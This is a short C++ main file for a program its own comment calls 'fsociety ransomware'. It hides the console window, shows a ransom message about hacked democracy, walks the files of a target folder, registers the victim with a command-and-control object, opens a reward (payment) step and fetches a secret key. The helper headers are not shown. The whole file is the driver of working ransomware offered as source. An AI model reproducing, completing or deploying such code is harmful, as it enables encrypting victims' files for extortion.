#include <iostream>
#include <iomanip>
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(_CYGWIN_)
    #define WIN32_WINNT 0x0500
    #include <windows.h>
#endif
#include "fsociety.h"
#include "after_day.h"
// fsociety ransomware by graniet

int main(void)
{
    byte* secret_key;
    fsociety fs;
    #if defined(WIN32)
    fs.show_democracy();
    fs.hide_console();
    #else
    std::cout << "Our democracy has been hacked." << std::endl;
    #endif
    char *folder = "/root/Bureau";
    fs.listfiledirectory(folder);
    CandC command;
    command.nb_file = fs.number_to_string(fs.nb_file);
    command.checkifconnected();
    command.insert_target();
    command.openReward();
    secret_key = fs.get_secret_key();
   //std::cout << "secret key : " << secret_key << std::endl;
}
